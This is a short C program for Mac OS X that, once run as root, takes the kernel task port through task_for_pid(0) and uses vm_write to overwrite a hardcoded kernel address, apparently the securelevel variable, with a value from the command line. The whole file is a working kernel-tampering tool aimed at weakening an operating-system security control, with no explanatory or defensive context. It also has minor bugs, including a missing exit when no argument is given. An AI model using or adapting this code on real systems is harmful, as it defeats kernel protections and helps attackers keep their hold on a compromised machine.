/*COMPLETELY BASED ON NEMO's EXAMPLE CODE */

#include <mach/mach.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>

#define SECLVLADDR 0x0054f9d0

void error(char *msg) {
	printf("Error %s\n", msg);
	exit(1);
}

int main(int argc, char **argv) {
	mach_port_t	kernel_task;
	kern_return_t	err;
	long		value = 0;
	
	if(argc != 2) {
		printf("must supply value!\n");
	}

	if(getuid() && geteuid()) {
		error("Root priviledges required!\n");
	}

	value = atoi(argv[1]);
	err = task_for_pid(mach_task_self(), 0, &kernel_task);
	if((err != KERN_SUCCESS) || !MACH_PORT_VALID(kernel_task)) {
		error("getting kernel task.");
	}
	if(vm_write(kernel_task, (vm_address_t) SECLVLADDR, (vm_address_t)&value, sizeof(value))) {
		error("writing arg to dlopen.");
	}

	printf("Done!\n");
	return 0;
}

